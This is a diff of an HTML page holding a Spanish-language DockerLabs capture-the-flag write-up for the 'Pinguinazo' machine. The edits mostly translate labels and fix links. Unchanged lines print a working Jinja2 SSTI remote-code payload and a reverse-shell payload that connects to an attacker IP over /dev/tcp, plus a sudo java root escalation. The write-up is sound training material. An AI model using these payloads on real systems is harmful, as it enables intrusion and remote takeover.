@@ -193,21 +193,22 @@
 <div class="cursor-ring" id="cursorRing"></div>
 
 <nav>
-  <a href="../../index.html" class="nav-logo">BRANDEIKS_SEC</a>
-  <a href="https://brandeiks.github.io/writeups/" class="nav-back">volver al portafolio</a>
-</nav>
+    <a href="../../../index.html" class="nav-logo">BRANDEIKS_SEC</a>
+    <a href="../../../writeups/index.html" class="nav-back">ANÁLISIS</a>
+    <a href="../../../diccionario/index.html" class="nav-back">DICCIONARIO</a>
+  </nav>
 
 <!-- HERO -->
 <div class="writeup-hero">
   <div class="hero-grid"></div>
   <div class="hero-glow"></div>
   <div class="writeup-hero-content">
-    <p class="breadcrumb">
-      <a href="https://brandeiks.github.io/">brandeiks</a> /
-      <a href="https://brandeiks.github.io/writeups/">writeups</a> /
-      <a href="https://brandeiks.github.io/writeups/">dockerlabs</a> /
+    <div class="breadcrumb">
+      <a href="../../../index.html">brandeiks</a> /
+      <a href="../../../writeups/index.html">análisis</a> /
+      <a href="../../../writeups/index.html">dockerlabs</a> /
       <span>pinguinazo</span>
-    </p>
+    </div>
     <h1 class="writeup-title"><span>Pinguinazo</span></h1>
     <p class="writeup-subtitle">DockerLabs — Linux · SSTI Jinja2 en Flask → reverse shell → sudo java → root</p>
     <div class="writeup-meta">
@@ -216,7 +217,7 @@
       <span class="meta-badge badge-linux">LINUX</span>
       <span class="meta-badge badge-ssti">SSTI · Jinja2</span>
       <span class="meta-badge badge-java">sudo · Java</span>
-      <span class="meta-date">📅 Junio 2026 · By Brandeiks</span>
+      <span class="meta-date">📅 Junio 2026 · Por Brandeiks</span>
     </div>
   </div>
 </div>
@@ -233,7 +234,7 @@
         <li><a href="#despliegue">02 · Despliegue</a></li>
         <li><a href="#reconocimiento">03 · Reconocimiento</a></li>
         <li><a href="#ssti">04 · SSTI Jinja2</a></li>
-        <li><a href="#revshell">05 · Reverse Shell</a></li>
+        <li><a href="#revshell">05 · Reverse shell</a></li>
         <li><a href="#privesc">06 · Escalada · sudo Java</a></li>
         <li><a href="#referencia">07 · Referencia de Comandos</a></li>
         <li><a href="#glosario">08 · Glosario</a></li>
@@ -250,7 +251,7 @@
       <div class="info-row"><span class="info-label">PRIVESC</span><span class="info-val val-orange">sudo java</span></div>
     </div>
     <div class="sidebar-box">
-      <p class="sidebar-title">// ATTACK PATH</p>
+      <p class="sidebar-title">// RUTA DE ATAQUE</p>
       <div class="attack-path">
         <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>Nmap</span> → puerto 5000 Flask</div></div>
         <div class="ap-line"></div>
@@ -302,7 +303,7 @@
           <tr><td>Reconocimiento</td><td>nmap -p- -sSCV + xsltproc</td><td>Puerto 5000 · Werkzeug Flask (Python 3.12.3)</td></tr>
           <tr><td>Enumeración Web</td><td>Navegador → :5000</td><td>Formulario PinguRegistro — entrada reflejada sin sanitizar</td></tr>
           <tr><td>Explotación</td><td>SSTI Jinja2 via cycler.__init__</td><td>RCE como usuario pinguinazo</td></tr>
-          <tr><td>Reverse Shell</td><td>Payload SSTI + nc -nlvp 4444</td><td>Shell interactiva como pinguinazo</td></tr>
+          <tr><td>Reverse shell</td><td>Payload SSTI + nc -nlvp 4444</td><td>Shell interactiva como pinguinazo</td></tr>
           <tr><td>PrivEsc</td><td>sudo java + Shell.java + GTFObins</td><td>Shell como root</td></tr>
         </tbody>
       </table>
@@ -329,7 +330,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="sudo bash auto_deploy.sh pinguinazo.tar">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">DEPLOY</span>
         <div><span class="prompt">$ </span><span class="cmd">sudo bash <span class="arg">auto_deploy.sh</span> <span class="arg">pinguinazo.tar</span></span></div>
       </div>
@@ -366,7 +367,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="sudo nmap -p- -sSCV -n -Pn --min-rate=5000 --open 172.17.0.2 -oX pinguinazo.xml">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">NMAP</span>
         <div><span class="prompt">$ </span><span class="cmd">sudo nmap <span class="flag">-p-</span> <span class="flag">-sSCV</span> <span class="flag">-n</span> <span class="flag">-Pn</span> <span class="flag">--min-rate=5000</span> <span class="flag">--open</span> <span class="arg">172.17.0.2</span> <span class="flag">-oX</span> <span class="arg">pinguinazo.xml</span></span></div>
       </div>
@@ -399,7 +400,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="xsltproc /usr/share/nmap/nmap.xsl pinguinazo.xml > pinguinazo.html">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">XSLTPROC</span>
         <div><span class="prompt">$ </span><span class="cmd">xsltproc <span class="arg">/usr/share/nmap/nmap.xsl</span> <span class="arg">pinguinazo.xml</span> &gt; <span class="arg">pinguinazo.html</span></span></div>
       </div>
@@ -454,7 +455,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">SSTI PAYLOAD</span>
         <div><span class="ssti">{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}</span></div>
       </div>
@@ -477,7 +478,7 @@
     <!-- REVERSE SHELL -->
     <div class="section" id="revshell">
       <p class="section-label">// 05</p>
-      <h2 class="section-title">Reverse Shell</h2>
+      <h2 class="section-title">Reverse shell</h2>
       <div class="section-line"></div>
 
       <div class="step-marker">
@@ -494,7 +495,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="ifconfig">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">IFCONFIG</span>
         <div><span class="prompt">$ </span><span class="cmd">ifconfig</span></div>
       </div>
@@ -517,7 +518,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="nc -nlvp 4444">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">LISTENER</span>
         <div><span class="prompt">$ </span><span class="cmd">nc <span class="flag">-nlvp</span> <span class="arg">4444</span></span></div>
       </div>
@@ -540,7 +541,7 @@
       </div>
 
       <div class="cmd-block" data-cmd='{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('"'"'bash -c "sh -i >& /dev/tcp/192.168.111.128/4444 0>&1"'"'"').read() }}'>
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">REVSHELL SSTI</span>
         <div><span class="ssti">{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('bash -c "sh -i &gt;&amp; /dev/tcp/192.168.111.128/4444 0&gt;&amp;1"').read() }}</span></div>
       </div>
@@ -567,7 +568,7 @@
     <!-- PRIVESC -->
     <div class="section" id="privesc">
       <p class="section-label">// 06</p>
-      <h2 class="section-title">Escalada de Privilegios — sudo Java</h2>
+      <h2 class="section-title">Escalada de privilegios — sudo Java</h2>
       <div class="section-line"></div>
 
       <div class="step-marker">
@@ -584,7 +585,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="sudo -l">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">SUDO -L</span>
         <div><span class="prompt">$ </span><span class="cmd">sudo <span class="flag">-l</span></span></div>
       </div>
@@ -628,7 +629,7 @@ public class Shell {
   }
 }
 EOF">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">CREAR Shell.java</span>
         <div><span class="prompt">$ </span><span class="cmd">cat &gt;Shell.java &lt;&lt;EOF</span></div>
         <div><span class="arg">public class Shell {</span></div>
@@ -640,7 +641,7 @@ EOF">
       </div>
 
       <div class="cmd-block" data-cmd="javac Shell.java">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">COMPILAR</span>
         <div><span class="prompt">$ </span><span class="cmd">javac <span class="arg">Shell.java</span></span></div>
       </div>
@@ -659,7 +660,7 @@ EOF">
       </div>
 
       <div class="cmd-block" data-cmd="sudo java Shell">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">PRIVESC</span>
         <div><span class="prompt">$ </span><span class="cmd">sudo java <span class="arg">Shell</span></span></div>
       </div>
@@ -761,7 +762,7 @@ EOF">
         </div>
 
         <div class="glos-card">
-          <div class="glos-term">Reverse Shell — Shell Inversa</div>
+          <div class="glos-term">Reverse shell — Shell Inversa</div>
           <div class="glos-def">Una <strong>reverse shell</strong> es una técnica donde el sistema comprometido inicia la conexión hacia el atacante (en lugar del atacante conectarse al objetivo). Esto evita firewalls que bloquean conexiones entrantes. El comando <code>sh -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1</code> redirige stdin, stdout y stderr de una shell interactiva a través de un socket TCP hacia la máquina atacante. El atacante escucha con <code>nc -nlvp PORT</code> y recibe la shell cuando el payload se ejecuta.</div>
         </div>
 
@@ -782,9 +783,9 @@ EOF">
 </div>
 
 <footer>
-  <p>© 2026 <span>Brandon Zevallos Pastrana</span> — Writeup personal · DockerLabs</p>
-  <p>Built with <span>kali linux</span> &amp; <span>❤</span></p>
-</footer>
+    <p>© 2026 <span>Brandon Zevallos Pastrana</span> — Análisis de Pinguinazo · DockerLabs</p>
+    <p>Hecho con <span>kali linux</span> &amp; <span>❤</span></p>
+  </footer>
 
 <script>
   // TOC ACTIVE
